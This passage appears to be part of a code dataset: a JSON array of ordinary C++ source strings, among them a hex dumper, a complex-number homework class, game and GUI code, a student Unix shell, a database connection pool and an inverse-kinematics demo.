true;\r\n}\r\n\r\nvoid PrintHexData(const BYTE* Data, ULONG Length) {\r\n\r\n    for (uint64_t i = 0; i < Length; i += 16) {\r\n        printf(\"0x%08llXh:  \", i);\r\n\r\n        for (uint64_t j = 0; j < 16; ++j) {\r\n            if (i + j < Length) {\r\n                printf(\"%02X \", static_cast<unsigned int>(Data[i + j]));\r\n            }\r\n            else {\r\n                printf(\"   \");\r\n            }\r\n        }\r\n\r\n        printf(\"  \");\r\n\r\n        for (uint64_t j = 0; j < 16; ++j) {\r\n            if (i + j < Length) {\r\n                char c = Data[i + j];\r\n                printf(\"%c\", std::isprint(c) ? c : '.');\r\n            }\r\n        }\r\n\r\n        printf(\"\\n\");\r\n    }\r\n}",
    "#include \"concurrency_test.h\"\n#include <sstream>\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <cstring>\n\nvoid TestCaseAnalyzer::analyze_operation(Operation* operation, const std::string& operation_line) {\n    operation->name = operation_line.substr(0, operation_line.find(\" \"));\n    operation->sql = operation_line.substr(operation_line.find(\" \") + 1);\n}\n\nvoid TestCaseAnalyzer::analyze_test_case() {\n    std::string line;\n\n    infile.open(infile_path);\n\n    Operation* crash_operation = new Operation();\n    crash_operation->sql = \"crash\";\n    crash_operation->txn_id = -1;\n\n    while(std::getline(infile, line)) {\n        if(line.find(\"preload\") != std::string::npos) {\n            int count = atoi(line.substr(line.find(\" \") + 1).c_str());\n            while(count) {\n                --count;\n                std::getline(infile, line);\n                preload.push_back(line);\n            }\n        }\n        else if(line.find(\"txn\") != std::string::npos) {\n            Transaction* txn = new Transaction();\n\n            transactions.push_back(txn);\n            txn->txn_id = transactions.size() - 1;\n\n            int count = atoi(line.substr(line.find(\" \") + 1).c_str());\n            while(count) {\n                --count;\n                std::getline(infile, line);\n                Operation* operation = new Operation();\n                txn->operations.push_back(operation);\n                analyze_operation(operation, line);\n                operation->txn_id = txn->txn_id;\n                operation_map[operation->name] = operation;\n            }\n        }\n        else if(line.find(\"permutation\") != std::string::npos) {\n            int count = atoi(line.substr(line.find(\" \") + 1).c_str());\n            while(count) {\n                --count;\n                std::getline(infile, line);\n                if(strcmp(line.c_str(), \"crash\") == 0) {\n                    // permutation->operations.push_back(crash_operation);\n                    break;\n                }\n                else {\n                    permutation->operations.push_back(operation_map[line]);\n                }\n            }\n        }\n    }\n}",
    "/*\nImplement a class Complex which represents the Complex Number data type. Implement the\nfollowing\n1. Constructor (including a default constructor which creates the complex number 0+0i).\n2. Overload operator+ to add two complex numbers.\n3. Overload operator* to multiply two complex numbers.\n4. Overload operators << and >> to print and read Complex Numbers.\n*/\n#include <iostream>\nusing namespace std;\n\n// Class definition for Complex numbers\nclass Complex {\n    double real; // Real part of the complex number\n    double img;  // Imaginary part of the complex number\n\npublic:\n    // Constructors\n    Complex(); // Default constructor\n    Complex(double r, double i); // Parameterized constructor\n\n    // Operator overloading for addition and multiplication\n    Complex operator + (const Complex&); // Addition operator overload\n    Complex operator * (const Complex&); // Multiplication operator overload\n\n    // Friend functions for input and output\n    friend istream& operator >> (istream&, Complex&);\n    friend ostream& operator << (ostream&, const Complex&);\n};\n\n// Default constructor initializes complex number to 0 + 0i\nComplex::Complex() {\n    real = 0;\n    img = 0;\n}\n\n// Parameterized constructor initializes complex number to specified real and imaginary parts\nComplex::Complex(double r, double i) {\n    real = r;\n    img = i;\n}\n\n// Overloading >> operator for reading Complex numbers from input\nistream& operator >> (istream& in, Complex& c) {\n    cout << \"Enter real part: \";\n    in >> c.real;\n    cout << \"Enter imaginary part: \";\n    in >> c.img;\n    return in;\n}\n\n// Overloading << operator for printing Complex numbers to output\nostream& operator << (ostream& out, const Complex& c) {\n    out << c.real << \" + i\" << c.img << \"\\n\";\n    return out;\n}\n\n// Overloading + operator for adding two Complex numbers\nComplex Complex::operator + (const Complex& c) {\n    Complex temp;\n    temp.real = real + c.real; // Adding real parts\n    temp.img = img + c.img;    // Adding imaginary parts\n    return temp;               // Returning the result as a new Complex object\n}\n\n// Overloading * operator for multiplying two Complex numbers\nComplex Complex::operator * (const Complex& c) {\n    Complex tmp;\n    tmp.real = real * c.real - img * c.img; // Multiplying using complex number multiplication formula\n    tmp.img = real * c.img + img * c.real;\n    return tmp; // Returning the result as a new Complex object\n}\n\n// Main function\nint main() {\n    Complex C1, C2, C3, C4; // Declaring four Complex objects to store complex numbers\n    int flag = 1; // Flag to control program execution\n    char b;\n\n    // Outer loop to continue running the program until flag is set to 0\n    while (flag == 1) {\n        // Prompting user to enter real and imaginary parts for Complex Number 1\n        cout << \"Enter Real and Imaginary part of the Complex Number 1:\\n\";\n        cin >> C1;\n\n        // Prompting user to enter real and imaginary parts for Complex Number 2\n        cout << \"Enter Real and Imaginary part of the Complex Number 2:\\n\";\n        cin >> C2;\n\n        int operation; // Variable to store user's operation choice\n\n        // Displaying Complex numbers entered by user\n        cout << \"Complex Number 1: \" << C1 << endl;\n        cout << \"Complex Number 2: \" << C2 << endl;\n\n        // Displaying menu options\n        cout << \"********** MENU **********\" << endl;\n        cout << \"1. Addition of Complex Numbers\" << endl;\n        cout << \"2. Multiplication of Complex Numbers\" << endl;\n        cout << \"3. Exit\" << endl;\n        cout << \"Enter your choice from the MENU (1 to 3): \";\n        cin >> operation;\n\n        // Performing operation based on user's choice\n        if (operation == 1) {\n            // Addition operation\n            C3 = C1 + C2;\n            cout << \"Addition Result: \" << C3 << endl;\n        } else if (operation == 2) {\n            // Multiplication operation\n            C4 = C1 * C2;\n            cout << \"Multiplication Result: \" << C4 << endl;\n        } else if (operation == 3) {\n            // Exiting the program\n            cout << \"Exiting program. Thank you!\\n\";\n            flag = 0; // Setting flag to 0 to exit outer loop\n        } else {\n            // Invalid choice\n            cout << \"Invalid choice! Please enter again.\\n\";\n        }\n\n        // Asking user if they want to perform another operation\n        if (flag != 0) {\n            cout << \"Do you want to perform another operation? (y/n): \";\n            cin >> b;\n            if (b != 'y' && b != 'Y') {\n                flag = 0; // Setting flag to 0 to exit outer loop\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"header.h\"\nusing namespace std;\nusing namespace sf;\nvoid set_view(View& view, double x, double y)\n{\n    int N = level::mapping.size(), M = level::mapping[0].size();\n    double vx = x - slen / 2, vy = y - slen / 2;\n    if (vx < W / 2 + slen)\n        vx = W / 2 + slen;\n    else if (vx > M * slen - W / 2 - slen)\n        vx = M * slen - W / 2 - slen;\n\n    if (vy < H / 2 + (border + 1) * slen)\n        vy = H / 2 + (border + 1) * slen;\n    else if (vy > N * slen - H / 2 - (border + 1) * slen)\n        vy = N * slen - H / 2 - (border + 1) * slen;\n    view.setCenter(vx, vy);\n}\n\n\n\nvector<vector<int>> level::mapping;\nvector<enemy*> level::en;\nbool level::chp = false;\nlevel::level(string map_file, string texture_file) : map_file(map_file)\n{\n    Image img_base, img;\n    img_base.loadFromFile(\"../../a/base.png\");\n    img_base.createMaskFromColor(Color(195, 195, 195));\n    texture_base.loadFromImage(img_base);\n    sprite_base.setTexture(texture_base);\n\n    img.loadFromFile(texture_file);\n    img.createMaskFromColor(Color(195, 195, 195));\n    texture.loadFromImage(img);\n    sprite.setTexture(texture);\n}\nvoid level::to_black()\n{\n    sprite.setColor(Color::Black);\n    sprite_base.setColor(Color::Black);\n}\n\nvoid level::fill_row(int k, int a, int x)\n{\n    int i;\n    mapping.push_back(vector<int>());\n    mapping[k].push_back(invis);\n    for (i = 0; i < x; i++)\n        mapping[k].push_back(a);\n    mapping[k].push_back(invis);\n}\nvoid level::load()\n{\n    int i, j, k = 0;\n    Color col;\n    Image img_map;\n    img_map.loadFromFile(map_file);\n    mapping.clear();\n\n    for (i = en.size() - 1; i >= 0; i--)\n        delete en[i];\n    en.clear();\n\n    fill_row(k++, invis, img_map.getSize().x);\n    for (i = 0; i < border; i++, k++)\n        fill_row(k, 0, img_map.getSize().x);\n\n    for (i = 0; i < img_map.getSize().y; i++, k++)\n    {\n        mapping.push_back(vector<int>());\n        mapping[k].push_back(invis);\n        for (j = 0; j < img_map.getSize().x; j++)\n        {\n            col = img_map.getPixel(j, i);\n            switch (col.r)\n            {\n            case 0: mapping[k].push_back(invis); break;\n            case 5: mapping[k].push_back(fake_regular); break;\n            case 50: mapping[k].push_back(regular); break;\n            case 75: mapping[k].push_back(semi_sol); break;\n            case 100: mapping[k].push_back(start_trig);\n                if (!chp)\n                {\n                    character::start_i = k + 1;\n                    character::start_j = j + 1;\n                }\n                break;\n            case 105: mapping[k].push_back(door); break;\n            case 110: mapping[k].push_back(fake_door); break;\n            case 150: mapping[k].push_back(spike_up); break;\n            case 155: mapping[k].push_back(spike_down); break;\n            case 200: mapping[k].push_back(killbox); break;\n            case 205: mapping[k].push_back(0);\n                en.push_back(new en1((j + 1) * slen, k * slen));\n                break;\n            case 255:\n            {\n                if (col.g == 255)\n                {\n                    if (col.b == 255)\n                        mapping[k].push_back(0);\n                    else\n                        mapping[k].push_back(trigger + col.b);\n                }\n                else\n                {\n                    if (col.b == 0)\n                        mapping[k].push_back(regular + 1 + col.g);\n                    else if (col.b == 255)\n                        mapping[k].push_back(background - col.g);\n                    else\n                        mapping[k].push_back(0);\n                }\n                break;\n            }\n            default: mapping[k].push_back(0);\n            }\n        }\n        mapping[k].push_back(invis);\n    }\n\n    fill_row(k++, 0, img_map.getSize().x);\n    fill_row(k++, killbox, img_map.getSize().x);\n    for (i = 0; i < border - 2; i++, k++)\n        fill_row(k, 0, img_map.getSize().x);\n    fill_row(k, invis, img_map.getSize().x);\n}\n\nvoid level::view_borders(int& i, int& j, int& n, int& m, View view)\n{\n    int N = mapping.size(), M = mapping[0].size();\n    i = (view.getCenter().y - H / 2) / slen - 1;\n    if (i < 0)\n        i = 0;\n\n    n = (view.getCenter().y + H / 2) / slen + 1;\n    if (n > N)\n        n = N;\n\n    j = (view.getCenter().x - W / 2) / slen - 1;\n    if (j < 0)\n        j = 0;\n\n    m = (view.getCenter().x + W / 2) / slen + 1;\n    if (m > M)\n        m = M;\n}\nvoid level::build(double t, RenderWindow& window, View view)\n{\n    int i, j, i2, j2, k, n, m;\n    view_borders(i, j, n, m, view);\n    i2 = i;\n    j2 = j;\n\n    for (; i < n; i++)\n    {\n        for (j = j2; j < m; j++)\n        {\n            switch (mapping[i][j])\n            {\n            case regular: case fake_regular: sprite_base.setTextureRect(IntRect(3 * slen, 0, slen, slen)); break;\n            case semi_sol: sprite_base.setTextureRect(IntRect(slen, slen, slen, slen)); break;\n            case spike_up: sprite_base.setTextureRect(IntRect(0, slen, slen, slen)); break;\n   ",
    "//This project was created by following along with Casey Muratory's Handmade\n//Hero tutorials. For details on the project, go to https://handmadehero.org/\n#include<windows.h>\n#include<stdint.h>\n#include<xinput.h>\n\n#define internal static\n#define local_persist static\n#define global_variable static\n\ntypedef int8_t int8;\ntypedef int16_t int16;\ntypedef int32_t int32;\ntypedef int64_t int64;\n\ntypedef uint8_t uint8;\ntypedef uint16_t uint16;\ntypedef uint32_t uint32;\ntypedef uint64_t uint64;\n\n\nstruct win32_offscreen_buffer\n{\n\t//NOTE(Casey): Pixels are always 32-bits wide, Memory Order BB GG RR XX\n\tBITMAPINFO Info;\n\tvoid *Memory;\n\tint Width;\n\tint Height;\n\tint Pitch;\n};\n\nstruct win32_window_dimension\n{\n\tint Width;\n\tint Height;\n};\n\nwin32_window_dimension\nWin32GetWindowDimension(HWND Window)\n{\n\twin32_window_dimension Result;\n\t\n\tRECT ClientRect;\n\tGetClientRect(Window, &ClientRect);\n\tResult.Width = ClientRect.right - ClientRect.left;\n\tResult.Height = ClientRect.bottom - ClientRect.top;\n\n\treturn(Result);\n}\n\n//TODO (Casey) This is a global for now.\nglobal_variable bool Running; //statics always init to 0\nglobal_variable win32_offscreen_buffer GlobalBackbuffer;\n\n\ninternal void\nRenderWeirdGradient(win32_offscreen_buffer Buffer, int XOffset, int YOffset)\n{\n\t//TODO(Casey) Let's see what the optimizer does.\n\t\n\tuint8 *Row = (uint8*)Buffer.Memory;\n\tfor(int Y=0; \n\t\tY<Buffer.Height; \n\t\t++Y)\n\t{\n\t\tuint32 *Pixel = (uint32 *)Row;\n\t\tfor(int X=0; \n\t\t\tX<Buffer.Width;\n\t\t\t++X)\n\t\t{\n\t\t\tuint8 Blue = (X+XOffset);\n\t\t\tuint8 Green = (Y+YOffset);\n\n\t\t\t*Pixel++ = ((Green << 8) | Blue);\n\t\t}\n\t\t\n\t\tRow += Buffer.Pitch;\n\t}\n}\n\ninternal void\nWin32ResizeDIBSection(win32_offscreen_buffer *Buffer, int Width, int Height)\n{\n\t//TODO(casey): Bulletproof this\n\t//Maybe don't free first, free after, then free first if that fails\n\n\tif(Buffer->Memory)\n\t{\n\t\tVirtualFree(Buffer->Memory, 0, MEM_RELEASE);\n\t}\n\n\tBuffer->Width = Width;\n\tBuffer->Height = Height;\n\tint BytesPerPixel = 4;\n\t\n\t//NOTE: When the bitHeight field is negative, this is the clue to\n\t//Windows to treat this bitmap as top-down, not bottom-up, meaning that\n\t//the first three bytes of the image are the color for the top-left pixel\n\t//in the bitmap, not the bottom-left.\n\tBuffer->Info.bmiHeader.biSize = sizeof(Buffer->Info.bmiHeader);\n\tBuffer->Info.bmiHeader.biWidth = Buffer->Width;\n\tBuffer->Info.bmiHeader.biHeight = -Buffer->Height;\n\tBuffer->Info.bmiHeader.biPlanes = 1;\n\tBuffer->Info.bmiHeader.biBitCount = 32; //1B padding so px stay alignsed on 4B boundaries\n\tBuffer->Info.bmiHeader.biCompression = BI_RGB;\n\n\t//NOTE(Casey): Thank you to Chris Hecker of Spy Party fame\n\t//for clarifying the deal with StretchDIBits and BitBlt!\n\t//No more DC for us.\n\tint BitmapMemorySize = (Buffer->Width*Buffer->Height)*BytesPerPixel;\n\tBuffer->Memory = VirtualAlloc(0, BitmapMemorySize, MEM_COMMIT, PAGE_READWRITE);\n\n\t//TODO(casey): Probably clear this to black\n\n\tBuffer->Pitch = Width*BytesPerPixel;\n}\n\ninternal void\nWin32DisplayBufferInWindow(HDC DeviceContext,\n\t\t\t\t\t\t   int WindowWidth, int WindowHeight,\n\t\t\t\t\t\t   win32_offscreen_buffer Buffer)\n{\n\t//TODO(Casey) Aspect ratio correction\n\tStretchDIBits(DeviceContext,\n\t\t\t\t  /*\n\t\t\t\t  X, Y, Width, Height,\n\t\t\t\t  X, Y, Width, Height,\n\t\t\t\t  */\n\t\t\t\t  0, 0, WindowWidth, WindowHeight,\n\t\t\t\t  0, 0, Buffer.Width, Buffer.Height,\n\t\t\t\t  Buffer.Memory,\n\t\t\t\t  &Buffer.Info,\n\t\t\t\t  DIB_RGB_COLORS, \n\t\t\t\t  SRCCOPY);\n}\n\nLRESULT CALLBACK\nWin32MainWindowCallBack(HWND Window,\n\t\t\t\t\t\tUINT Message,\n\t\t\t\t\t\tWPARAM WParam,\n\t\t\t\t\t\tLPARAM LParam)\n{\n\tLRESULT Result = 0;\n\tswitch(Message)\n\t{\n\t\tcase WM_SIZE:\n\t\t{\n\t\t} break;\n\t\t\n\t\tcase WM_CLOSE:\n\t\t{\n\t\t\t//TODO (Casey) Handle this with a message to the user?\n\t\t\tRunning = false;\n\t\t} break;\n\t\t\n\t\tcase WM_ACTIVATEAPP:\n\t\t{\n\t\t\tOutputDebugStringA(\"WM_ACTIVATEAPP\\n\");\n\t\t} break;\n\t\t\n\t\tcase WM_DESTROY:\n\t\t{\n\t\t\t//TODO (Casey) Handle this as an error - recreate window?\n\t\t\tRunning = false;\n\t\t} break;\n\t\t\n\t\tcase WM_SETCURSOR:\n\t\t{\n\t\t\tSetCursor(0);\n\t\t} break;\n\t\t\n\t\tcase WM_PAINT:\n\t\t{\n\t\t\tPAINTSTRUCT Paint;\n\t\t\tHDC DeviceContext = BeginPaint(Window, &Paint);\n\t\t\tint X = Paint.rcPaint.left;\n\t\t\tint Y = Paint.rcPaint.top;\n\t\t\tint Width = Paint.rcPaint.right - Paint.rcPaint.left;\n\t\t\tint\tHeight = Paint.rcPaint.bottom - Paint.rcPaint.top;\n\n\t\t\twin32_window_dimension Dimension = Win32GetWindowDimension(Window);\n\t\t\tWin32DisplayBufferInWindow(DeviceContext, Dimension.Width, Dimension.Height,\n\t\t\t\t\t\t\t\t\t   GlobalBackbuffer);\n\t\t\tEndPaint(Window, &Paint);\n\t\t} break;\n\t\t\n\t\tdefault :\n\t\t{\n\t\t\t//OutputDebugStringA(\"default\\n\");\n\t\t\tResult = DefWindowProc(Window, Message, WParam, LParam);\n\t\t} break;\n\t}\n\treturn(Result);\n};\n\nint CALLBACK\nWinMain(HINSTANCE Instance,\n\t\tHINSTANCE PrevInstance,\n\t\tLPSTR CommandLine,\n\t\tint ShowCode)\n{\n\tWNDCLASS WindowClass = {};\n\n\tWin32ResizeDIBSection(&GlobalBackbuffer, 1280, 720);\n\n\tWindowClass.style = CS_HREDRAW|CS_VREDRAW;\n\tWindowClass.lpfnWndProc = Win32MainWindowCallBack;\n\tWindowClass.hInstance = Instance;\n//\t  WindowClass.hIcon;\n\tWindowClass.lpszClassName = \"HandmadeHeroWindowClass\";\n\t\n\tif(Registe",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_planner\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"NativeBridgeTest.h\"\n\nnamespace android {\n\nTEST_F(NativeBridgeTest, V3_CreateNamespace) {\n    // Init\n    ASSERT_TRUE(LoadNativeBridge(kNativeBridgeLibrary3, nullptr));\n    ASSERT_TRUE(NativeBridgeAvailable());\n    ASSERT_TRUE(PreInitializeNativeBridge(\".\", \"isa\"));\n    ASSERT_TRUE(NativeBridgeAvailable());\n    ASSERT_TRUE(InitializeNativeBridge(nullptr, nullptr));\n    ASSERT_TRUE(NativeBridgeAvailable());\n\n    ASSERT_EQ(3U, NativeBridgeGetVersion());\n    ASSERT_EQ(nullptr, NativeBridgeCreateNamespace(nullptr, nullptr, nullptr,\n                                                   0, nullptr, nullptr));\n\n    // Clean-up code_cache\n    ASSERT_EQ(0, rmdir(kCodeCache));\n}\n\n}  // namespace android\n",
    "// Rylan Casanova\n// 02/26/23\n// CST-315\n// Project 1: Improved Unix/Linux Command Line Interpreter\n\n#include <iostream>\n#include <cstring>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <readline/readline.h>\n#include <readline/history.h>\n\nusing namespace std;\n\n#define MAX_ARGS 10\n#define MAX_LEN 100\n\nvoid parseCommand(char *command, char **args)\n{\n    int i = 0;\n    args[i] = strtok(command, \" \"); // split arguments string into tokens using space (\" \") as the delimiter\n    while (args[i] != NULL)\n    {\n        i++;\n        args[i] = strtok(NULL, \" \");\n    }\n}\n\nvoid executeCommand(char **args)\n{\n    pid_t pid = fork();\n    if (pid == -1) // if parent id = -1 (does not exist)\n    {\n        cout << \"Error: Unable to create child process\" << endl;\n        return;\n    }\n    else if (pid == 0)\n    {\n        if (execvp(args[0], args) == -1)\n        {\n            cout << \"Error: Command not found\" << endl;\n        }\n        exit(0);\n    }\n    else\n    {\n        wait(NULL);\n    }\n}\n\nint main()\n{\n    char *command;\n    char *args[MAX_ARGS];\n\n    while (1)\n    {\n        command = readline(\"$lopeShell: \");\n        if (command == NULL) // if user pressed CTRL-D\n        {\n            break;\n        }\n\n        int n = strlen(command);\n        if (n == 0)\n        {\n            continue; // if empty string (no more commands to enter)\n        }\n\n        add_history(command); // add command to history\n\n        int i = 0;\n        char *p = strtok(command, \";\"); // split up multiple commands using a semicolon\n        while (p != NULL)\n        {\n            parseCommand(p, args);\n\n\n            executeCommand(args);\n            p = strtok(NULL, \";\");\n        }\n        free(command);\n    }\n    return 0;\n}\n",
    "#include \"connectionpool.hpp\"\n#include \"public.hpp\"\n\nConnectionPool::ConnectionPool(){\n    // \u521b\u5efa\u521d\u59cb\u8fde\u63a5\n    for(int i = 0; i < _initSize; i++){\n        Connection* conn = new Connection();\n        conn->connect(_ip, _user, _password, _dbname);\n        _connQue.push(conn);\n        _connCnt++;\n    }\n    sem_init(&_sem, 0, 0);\n}\n\nConnectionPool::~ConnectionPool(){\n    closeConnectionPool();\n    cout << \"\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u9500\u6bc1...\" << endl;\n}\n\nvoid ConnectionPool::closeConnectionPool(){\n    // \u91ca\u653e\u6570\u636e\u5e93\u8fde\u63a5\n    while(!_connQue.empty()){\n        Connection* conn = _connQue.front();\n        _connQue.pop();\n        delete conn;\n    }\n    _connCnt = 0;\n    sem_destroy(&_sem);\n}\n\nConnectionPool* ConnectionPool::getInstance(){\n    // \u901a\u8fc7\u521b\u5efa\u9759\u6001\u5c40\u90e8\u5bf9\u8c61\u5b9e\u73b0\u7ebf\u7a0b\u5b89\u5168\n    static ConnectionPool pool;\n    return &pool;\n}\n\nshared_ptr<Connection> ConnectionPool::getConnction(){\n    // \u5bf9\u8fde\u63a5\u961f\u5217\u52a0\u9501\n    unique_lock<mutex> lock(_queMutex);\n    // \u5982\u679c\u961f\u5217\u4e3a\u7a7a\u5219\u6d88\u8d39\u8005\u91ca\u653e\u9501\u5e76\u7b49\u5f85\u5176\u4ed6\u7ebf\u7a0b\u91ca\u653e\u8fde\u63a5\n    while(_connQue.empty()){\n        LOG(\"get mysql connection timeout...\");\n        sem_wait(&_sem);\n    }\n    // \u81ea\u5b9a\u4e49\u667a\u80fd\u6307\u9488\u7684\u6790\u6784\u51fd\u6570, \u4f7f\u5f97\u521b\u5efa\u7684connection\u8d44\u6e90\u4e0d\u4f1a\u88ab\u56de\u6536, \u800c\u662f\u91cd\u65b0push\u5230\u961f\u5217\u4e2d\n    shared_ptr<Connection> conn(_connQue.front(), [&](Connection* ptrconn){\n        unique_lock<mutex> lock(_queMutex);\n        _connQue.push(ptrconn);\n        sem_post(&_sem);\n    });\n    _connQue.pop();\n    return conn;\n}",
    "/********************************************\n * IK solver by using circles method.\n * Readapted from : https://github.com/tushartalukder/Automated-Realtime-Robotic-Arm\n * \n * @ChaelPix\n*********************************************/\n#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include <iostream>\n#include <functional>\n#include <numeric>\n\nclass Vector2D {\npublic:\n    float x, y;\n\n    Vector2D(float x = 0, float y = 0) : x(x), y(y) {}\n\n    float length() const {\n        return std::sqrt(x * x + y * y);\n    }\n\n    Vector2D normalized() const {\n        float len = length();\n        return Vector2D(x / len, y / len);\n    }\n\n    float sin() const {\n        return y / length();\n    }\n\n    float cos() const {\n        return x / length();\n    }\n\n    Vector2D operator+(const Vector2D& other) const {\n        return Vector2D(x + other.x, y + other.y);\n    }\n\n    Vector2D operator-(const Vector2D& other) const {\n        return Vector2D(x - other.x, y - other.y);\n    }\n\n    Vector2D operator*(float scalar) const {\n        return Vector2D(x * scalar, y * scalar);\n    }\n\n    bool operator<(const Vector2D& other) const {\n        return length() < other.length();\n    }\n};\n\n\nbool checkTriangleValidity(float a, float b, float c) {\n    return a + b >= c && a + c >= b && b + c >= a;\n}\n\nstd::pair<Vector2D, Vector2D> getIntersections(Vector2D position1, float radius1, Vector2D position2, float radius2) {\n    Vector2D distanceVector = position2 - position1;\n    float distance = distanceVector.length();\n    float a = std::max((radius1 * radius1 - radius2 * radius2 + distance * distance) / (2 * distance), 0.0f);\n    float height = std::sqrt(std::max(radius1 * radius1 - a * a, 0.0f));\n    Vector2D heightVector(-height * distanceVector.sin(), height * distanceVector.cos());\n\n    Vector2D point = position1 + distanceVector.normalized() * a;\n    Vector2D intersection1 = point + heightVector;\n    Vector2D intersection2 = point - heightVector;\n\n    return std::make_pair(intersection1, intersection2);\n}\n\nfloat findSide(float minimalLength, float maximalLength, float side1, float side2) {\n    for (float side = maximalLength; side >= minimalLength; side -= 0.5f) {\n        if (checkTriangleValidity(side, side1, side2)) {\n            return side;\n        }\n    }\n    return 0;\n}\n\nstd::vector<Vector2D> resolveIK(const std::vector<float>& chain, std::vector<Vector2D>& vectors, Vector2D endEffector, float maximalDistance, Vector2D pole) {\n    std::vector<Vector2D> newVectors;\n    if (endEffector.length() > maximalDistance) {\n        endEffector = endEffector.normalized() * maximalDistance;\n    }\n    Vector2D currentSideVector = endEffector;\n\n    for (int i = chain.size() - 1; i > 0; --i) {\n        float currentSide = currentSideVector.length();\n        float newSide = findSide(0, std::accumulate(chain.begin(), chain.begin() + i, 0.0f), chain[i], currentSide);\n\n        auto intersections = getIntersections(currentSideVector, chain[i], Vector2D(0, 0), newSide);\n        Vector2D intersection = (intersections.first - pole < intersections.second - pole) ? intersections.first : intersections.second;\n\n        newVectors.insert(newVectors.begin(), currentSideVector - intersection);\n        currentSideVector = intersection;\n    }\n\n    newVectors.insert(newVectors.begin(), currentSideVector);\n    return newVectors;\n}\n\nvoid drawVectorsChain(sf::RenderWindow& window, Vector2D position, const std::vector<Vector2D>& chain, sf::Color color, float width = 1, bool drawCircles = false, float radius = 1, sf::Color circleColor = sf::Color::White) {\n    sf::CircleShape circle(radius);\n    circle.setFillColor(circleColor);\n\n    for (const auto& vector : chain) {\n        Vector2D newVector = position + Vector2D(vector.x, -vector.y);\n        sf::Vertex line[] = {\n            sf::Vertex(sf::Vector2f(position.x, position.y), color),\n            sf::Vertex(sf::Vector2f(newVector.x, newVector.y), color)\n        };\n        window.draw(line, 2, sf::Lines);\n\n        if (drawCircles) {\n            circle.setPosition(position.x - radius, position.y - radius);\n            window.draw(circle);\n            circle.setPosition(newVector.x - radius, newVector.y - radius);\n            window.draw(circle);\n        }\n\n        position = newVector;\n    }\n}\n\nint main() {\n    sf::RenderWindow window(sf::VideoMode(960, 540), \"Pixx Inverse Kinematics\");\n\n    std::vector<float> chain = {100, 60, 20};                                       //CHANGE CHAIN HERE\n    std::vector<Vector2D> vectors(chain.size(), Vector2D(0, 0));\n\n    Vector2D endEffector(0, 0);\n    Vector2D pole(0, 0);\n    float maximalDistance = std::accumulate(chain.begin(), chain.end(), 0.0f);\n\n    Vector2D screenMiddlePosition(window.getSize().x / 2, window.getSize().y / 2);\n    Vector2D poleGlobal(0, 0);\n    Vector2D endEffectorGlobal(0, 0);\n\n    sf::Clock clock;\n    const int fps = 60;\n    bool running = true;\n\n    while (running) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            i",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"PerspectiveMapFunctionLibrary.h\"\n#include \"MapActorClassifierComponent.h\"\n\n#include \"GameFramework/GameState.h\"\n\n\nUMapActorClassifierComponent* UPerspectiveMapFunctionLibrary::GetMapActorClassifier(const UObject* WorldContextObject)\n{\n\t// Retrieve the world from the context object\n#if ENGINE_MAJOR_VERSION == 4 && ENGINE_MINOR_VERSION <= 16\n\tUWorld* World = GEngine->GetWorldFromContextObject(WorldContextObject);\n#else\n\tUWorld* World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::ReturnNull);\n#endif\n\tif(!World)\n\t\treturn nullptr;\n\n\t// Minimap is pointless on dedicated server, so don't do any classifying\n\tif(World->GetNetMode() == ENetMode::NM_DedicatedServer)\n\t\treturn nullptr;\n\n\t// Retrieve the game state actor\n#if ENGINE_MAJOR_VERSION == 4 && ENGINE_MINOR_VERSION <= 13\n\tAGameState* GS = World->GetGameState();\n#else\n\tAGameStateBase* GS = World->GetGameState();\n#endif\n\n\t// Game state not found, assuming gameplay is not in progress\n\tif(!GS)\n\t\treturn nullptr;\n\n\t// Attempt to find a SceneCaptureClassifierComponent as component of the GameState actor\n\tUMapActorClassifierComponent* SceneCaptureClassifier = Cast<UMapActorClassifierComponent>(GS->GetComponentByClass(UMapActorClassifierComponent::StaticClass()));\n\tif(SceneCaptureClassifier)\n\t{\n\t\t// Found it, so return it\n\t\treturn SceneCaptureClassifier;\n\t}\n\telse\n\t{\n\t\t// Wasn't found, so create it once. Subsequent calls will find this one.\n\t\tSceneCaptureClassifier = NewObject<UMapActorClassifierComponent>(GS, TEXT(\"SceneCaptureClassifierComponent\"));\n\t\treturn SceneCaptureClassifier;\n\t}\n}",
